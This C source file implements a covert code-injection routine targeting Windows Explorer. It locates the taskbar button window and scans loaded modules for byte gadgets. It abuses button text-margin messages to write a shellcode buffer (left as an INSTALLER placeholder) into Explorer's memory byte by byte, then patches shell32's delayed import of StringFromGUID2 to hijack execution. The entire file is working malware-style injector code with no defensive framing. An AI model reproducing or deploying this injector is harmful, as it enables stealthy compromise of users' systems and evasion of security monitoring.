#include <Windows.h>
#include <tlhelp32.h>
#define IMAGE_REL_BASED_DIR64 10
#define BCM_FIRST 0x1600
#define BCM_GETTEXTMARGIN (BCM_FIRST + 0x0005)
#define BCM_SETTEXTMARGIN (BCM_FIRST + 0x0004)


typedef HMODULE (WINAPI *TLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *TGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *TOpenProcess)(ULONG_PTR, BOOL, ULONG_PTR);
typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(ULONG_PTR, ULONG_PTR);
typedef LPVOID (WINAPI *TVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, ULONG_PTR, ULONG_PTR);
typedef HLOCAL (WINAPI *TLocalAlloc)(UINT, SIZE_T);
typedef HLOCAL (WINAPI *TLocalFree)(HLOCAL);
typedef BOOL (WINAPI *TVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, ULONG_PTR, PULONG_PTR);
typedef BOOL (WINAPI *TModule32Next)(HANDLE, LPMODULEENTRY32);
typedef HWND (WINAPI *TFindWindowExW)(HWND, HWND, LPCWSTR,LPCWSTR);
typedef ULONG_PTR (WINAPI *TGetWindowThreadProcessId)(HWND, PULONG_PTR);
typedef LRESULT (WINAPI *TSendMessageA)(HWND, UINT, WPARAM, LPARAM);
typedef ULONG_PTR (WINAPI *TLoadStringW)(HINSTANCE, UINT, LPWSTR, ULONG_PTR);

struct Apis
{
    TLoadLibraryA pLoadLibraryA;
    TGetProcAddress pGetProcAddress;
    TFindWindowExW pFindWindowExW ;
    TGetWindowThreadProcessId pGetWindowThreadProcessId;
    TSendMessageA pSendMessageA;
    TLoadStringW pLoadStringW;
    TOpenProcess pOpenProcess;
    TCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;
    TVirtualAllocEx pVirtualAllocEx;
    TLocalAlloc pLocalAlloc;
    TLocalFree pLocalFree;
    TVirtualProtectEx pVirtualProtectEx;
    TModule32Next pModule32Next;
};


typedef struct ImgDelayDescr
{
    DWORD grAttrs;
    DWORD rvaDLLName;
    DWORD rvaHmod;
    DWORD rvaIAT;
    DWORD rvaINT;
    DWORD rvaBoundIAT;
    DWORD rvaUnloadIAT;
    DWORD dwTimeStamp;
} ImgDelayDescr, *PImgDelayDescr;

BYTE ShellCode[] =
{
#ifdef CODE64
//INSTALLER64
#else
//INSTALLER32
#endif
};

static inline char Toupper(char c)
{
    if (('a' <= c) && (c <= 'z'))
        return 'A' + (c - 'a');

    return c;
}

static inline int Strcasecmp(const char *s1, const char *s2)
{
    while (Toupper(*s1) == Toupper(*s2++))
    {
        if (*s1++ == '\0')
            return 0;
    }

    return 1;
}

static inline int Strcmp(const char *s1, const char *s2)
{
    while (*s1 == *s2++)
    {
        if (*s1++ == '\0')
            return 0;
    }

    return 1;
}

static inline int Memcmp(const void *s1, const void *s2, int size)
{
    const char *s1_ = (const char*)s1;
    const char *s2_ = (const char*)s2;

    for (int x = 0; x != size; ++x)
    {
        if (s1_[x] != s2_[x])
            return 1;
    }

    return 0;
}

static inline DWORD FindDelayIATEntry(HMODULE hMod, char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hMod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) &((PBYTE)hMod)[dosHeader->e_lfanew];
    PIMAGE_DATA_DIRECTORY delayedImports = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

    if(delayedImports->Size && delayedImports->VirtualAddress)
    {
        PImgDelayDescr pidd = (PImgDelayDescr)&((PBYTE)hMod)[delayedImports->VirtualAddress];
        PVOID rvaDLLName, rvaIAT, rvaINT;

        while (pidd->rvaDLLName)
        {
            if (pidd->grAttrs & 1)
            {
                rvaDLLName = &((PBYTE)hMod)[pidd->rvaDLLName];
                rvaIAT = &((PBYTE)hMod)[pidd->rvaIAT];
                rvaINT = &((PBYTE)hMod)[pidd->rvaINT];
            }
            else
            {
                rvaDLLName = (PVOID)pidd->rvaDLLName;
                rvaIAT = (PVOID)pidd->rvaIAT;
                rvaINT = (PVOID)pidd->rvaINT;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA) rvaINT;

            while (thunk->u1.AddressOfData != 0)
            {
                if (!IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME) &((PBYTE)hMod)[thunk->u1.AddressOfData];

                    if (Strcmp(functionName, (char*)&name->Name) == 0)
                    {
                        return (PBYTE)&thunk->u1.Function - (PBYTE)rvaINT + (PBYTE)rvaIAT - (PBYTE)hMod;
                    }
                }

                thunk += 1;
            }

            ++pidd;
        }
    }

    return 0;
}

static DWORD FindIATEntry(HMODULE hMod, char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hMod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) &((PBYTE) hMod)[dosHeader->e_lfanew];
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor;
    PIMAGE_DATA_DIRECTORY imports = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR zero = { 0 };

    for (importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) &((PBYTE)hMod)[imports->VirtualAddress];
            Memcmp(importDescriptor, &zero, sizeof(zero)) != 0; importDescriptor += 1)
    {

        PIMAGE_THUNK_DATA entry = (PIMAGE_THUNK_DATA) &((PBYTE)hMod)[importDescriptor->FirstThunk];
        PIMAGE_THUNK_DATA thunk = entry;

        if (importDescriptor->OriginalFirstThunk != 0)
            thunk = (PIMAGE_THUNK_DATA) &((PBYTE)hMod)[importDescriptor->OriginalFirstThunk];

        while (thunk->u1.AddressOfData != 0)
        {
            if (!IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
            {
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME) &((PBYTE)hMod)[thunk->u1.AddressOfData];

                if (Strcmp(functionName, (char*)&name->Name) == 0)
                {
                    return (PBYTE)&entry->u1.Function - (PBYTE)hMod;
                }
            }

            thunk += 1;
            entry += 1;
        }
    }

    return 0;
}

static inline BOOL FindBytesModules(TLoadLibraryA pLoadLibraryA,
                                    TLocalAlloc pLocalAlloc,
                                    TLocalFree pLocalFree,
                                    PVOID (*byteTable)[256],
                                    char *name,
                                    PVOID RemoteBaseAddress,
                                    DWORD modSize,
                                    PVOID *pStringFromGUID2,
                                    PVOID *pLoadLibrary,
                                    PVOID *pGetProcAddress)
{
    HMODULE hMod = pLoadLibraryA(name);
    PBYTE data = (PBYTE)pLocalAlloc(LPTR, modSize);

    if (hMod != NULL)
    {
        if (Strcasecmp("shell32.dll", name) == 0)
        {
            DWORD rpStringFromGUID2 = FindDelayIATEntry(hMod, "StringFromGUID2");

            if (rpStringFromGUID2 != 0)
            {
                *pStringFromGUID2 = &((PBYTE)RemoteBaseAddress)[rpStringFromGUID2];
            }
        }

        if (Strcasecmp("explorer.exe", name) == 0)
        {
            DWORD rpLoadLibrary = FindIATEntry(hMod, "LoadLibraryA");
            DWORD rpGetProcAddress = FindIATEntry(hMod, "GetProcAddress");

            if (rpLoadLibrary && rpGetProcAddress)
            {
                *pLoadLibrary = &((PBYTE)RemoteBaseAddress)[rpLoadLibrary];
                *pGetProcAddress = &((PBYTE)RemoteBaseAddress)[rpGetProcAddress];
            }

            pLocalFree(data);
            return FALSE;
        }

        BOOL scanBytes = FALSE;

        for (int x = 0; x != 256; ++x)
        {
            if ((*byteTable)[x] == NULL)
            {
                scanBytes = TRUE;
                break;
            }
        }

        if (scanBytes == TRUE)
        {
            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hMod;
            PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) &((PBYTE)hMod)[dosHeader->e_lfanew];
            DWORD codeStart = pe->OptionalHeader.BaseOfCode;
            DWORD codeEnd = codeStart + pe->OptionalHeader.SizeOfCode;
            PIMAGE_DATA_DIRECTORY relocs = &pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            for (int x = 0; x != modSize; ++x)
                data[x] = ((PBYTE)hMod)[x];

            if (!(pe->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) && relocs->VirtualAddress && relocs->Size)
            {
                PWORD relocData = (PWORD)&((PBYTE)hMod)[relocs->VirtualAddress];
                PIMAGE_BASE_RELOCATION chunk = { 0 };

                for (DWORD totalSize = 0; totalSize != relocs->Size; totalSize += chunk->SizeOfBlock)
                {
                    chunk = (PIMAGE_BASE_RELOCATION)relocData;
                    PBYTE relocBase = &((PBYTE)hMod)[chunk->VirtualAddress];
                    DWORD relocNumber = chunk->SizeOfBlock / sizeof(WORD);

                    for (DWORD count = 1; count != relocNumber; ++count)
                    {
                        PDWORD oldPos = (PDWORD)&relocBase[relocData[count] & 0x0FFF];

                        switch (relocData[count] >> 12)
                        {
#ifdef CODE64
                        case IMAGE_REL_BASED_DIR64:
                        *(PDWORD64)&data[(DWORD64)oldPos - (DWORD64)hMod] = *(PDWORD64)oldPos -
                                    (DWORD64)hMod + (DWORD64)RemoteBaseAddress;
#else
                        case IMAGE_REL_BASED_HIGH:
                            *(PWORD)&data[(DWORD)oldPos - (DWORD)hMod] = HIWORD(*oldPos) -
                                    HIWORD((DWORD)hMod) + HIWORD((DWORD)RemoteBaseAddress);
                            break;

                        case IMAGE_REL_BASED_LOW:
                            *(PWORD)&data[(DWORD)oldPos - (DWORD)hMod + sizeof(WORD)] = LOWORD(*oldPos) -
                                    LOWORD((DWORD)hMod) + LOWORD((DWORD)RemoteBaseAddress);
                            break;

                        case IMAGE_REL_BASED_HIGHLOW:
                            *(PDWORD)&data[(DWORD)oldPos - (DWORD)hMod] = *oldPos - (DWORD)hMod + (DWORD)RemoteBaseAddress;
                            break;
#endif
                        }
                    }

                    relocData = (PWORD)&((PBYTE)chunk)[chunk->SizeOfBlock];
                }
            }

            while (codeStart != codeEnd)
            {
                for (int x = 0; x != 256; ++x)
                {
                    if (data[codeStart] == (BYTE)x)
                        (*byteTable)[x] = (PBYTE)RemoteBaseAddress + codeStart;
                }

                ++codeStart;
            }
        }
        else
        {
            if (*pStringFromGUID2 && *pLoadLibrary && *pGetProcAddress)
            {
                pLocalFree(data);
                return TRUE;
            }
        }
    }

    pLocalFree(data);
    return FALSE;
}

static inline int InjectExplorer(struct Apis *api)
{
    WCHAR name[100];
    PVOID rpStringFromGUID2 = NULL;
    PVOID rpLoadLibrary = NULL;
    PVOID rpGetProcAddress = NULL;
    PVOID byteTable[256] = { NULL };
    MODULEENTRY32 me32 = { .dwSize = sizeof(MODULEENTRY32) };
    ULONG_PTR processId;
    ULONG_PTR flOldProtect;
    HMODULE hMod = api->pLoadLibraryA("explorer.exe");

    api->pLoadStringW((HINSTANCE)hMod, 595, name, 100);

    HWND hwnd = api->pFindWindowExW(NULL, NULL, L"Button", name);

    if (hwnd == 0)
    {
        hwnd = api->pFindWindowExW(NULL, NULL, L"Shell_TrayWnd", L"");
        hwnd = api->pFindWindowExW(hwnd, NULL, L"Button", name);

        if (hwnd == 0)
        {
            return -1;
        }
        
    }

    if (api->pGetWindowThreadProcessId(hwnd, &processId) == 0)
    {
        return -1;
    }

    HANDLE hProcess = api->pOpenProcess(PROCESS_VM_OPERATION, FALSE, processId);

    if (hProcess == 0)
    {
        return -1;
    }


    HANDLE hModuleSnap = api->pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processId);

    if (hModuleSnap == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    LPVOID addr = api->pVirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);

    if (addr == NULL)
    {
        return -1;
    }

    PVOID codeAddr = &((PVOID*)addr)[8];

    do
    {
        if (FindBytesModules(api->pLoadLibraryA,
                             api->pLocalAlloc,
                             api->pLocalFree,
                             &byteTable,
                             me32.szModule,
                             me32.modBaseAddr,
                             me32.modBaseSize,
                             &rpStringFromGUID2,
                             &rpLoadLibrary,
                             &rpGetProcAddress))
        {
            if (rpStringFromGUID2 == NULL || rpLoadLibrary == NULL || rpGetProcAddress == NULL)
                continue;


            for (int x = 0; x != sizeof(addr); ++x)
            {
                api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)byteTable[((PBYTE)&codeAddr)[x]]);
                api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PBYTE)addr)[x]);
            }

            api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)&((PVOID*)rpStringFromGUID2)[1]);
            api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PVOID*)addr)[1]);
            api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)rpStringFromGUID2);
            api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PVOID*)addr)[4]);
            api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)rpLoadLibrary);
            api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PVOID*)addr)[5]);
            api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)rpGetProcAddress);
            api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PVOID*)addr)[6]);

            for (int x = 0; x != sizeof(rpStringFromGUID2); ++x)
            {
                api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)byteTable[((PBYTE)&rpStringFromGUID2)[x]]);
                api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PBYTE)&((PVOID*)addr)[7])[x]);
            }

            for (int x = 0; x != sizeof(ShellCode); ++x)
            {
                api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)byteTable[ShellCode[x]]);
                api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)&((PBYTE)&((PVOID*)addr)[8])[x]);
            }

            if (api->pVirtualProtectEx(hProcess, addr, 0x1000, PAGE_EXECUTE_READ, &flOldProtect) == 0)
            {
				return -1;
            }
            
            // patch delayed iat
            api->pSendMessageA(hwnd, BCM_SETTEXTMARGIN, 0, (LPARAM)addr);
            api->pSendMessageA(hwnd, BCM_GETTEXTMARGIN, 0, (LPARAM)rpStringFromGUID2);
            return 0;
        }
    }
    while (api->pModule32Next(hModuleSnap, &me32));

    return -1;
}


void WINAPI Start(TLoadLibraryA pLoadLibraryA, TGetProcAddress pGetProcAddress)
{
    struct Apis api;
    HMODULE hMod = pLoadLibraryA("kernel32.dll");
    TLocalAlloc pLocalAlloc = (TLocalAlloc)pGetProcAddress(hMod, "LocalAlloc");

    api.pLoadLibraryA = pLoadLibraryA;
    api.pGetProcAddress = pGetProcAddress;
    api.pLocalAlloc = pLocalAlloc;

	api.pCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)pGetProcAddress(hMod, "CreateToolhelp32Snapshot");
    api.pOpenProcess = (TOpenProcess)pGetProcAddress(hMod, "OpenProcess");
    api.pVirtualAllocEx = (TVirtualAllocEx)pGetProcAddress(hMod, "VirtualAllocEx");
    api.pLocalFree = (TLocalFree)pGetProcAddress(hMod, "LocalFree");
    api.pVirtualProtectEx = (TVirtualProtectEx)pGetProcAddress(hMod, "VirtualProtectEx");
    api.pModule32Next = (TModule32Next)pGetProcAddress(hMod, "Module32Next");
    hMod = pLoadLibraryA("user32.dll");	
    api.pFindWindowExW = (TFindWindowExW)pGetProcAddress(hMod, "FindWindowExW");
    api.pGetWindowThreadProcessId = (TGetWindowThreadProcessId)pGetProcAddress(hMod, "GetWindowThreadProcessId");
    api.pSendMessageA = (TSendMessageA)pGetProcAddress(hMod, "SendMessageA");
    api.pLoadStringW = (TLoadStringW)pGetProcAddress(hMod, "LoadStringW");
    InjectExplorer(&api);
}

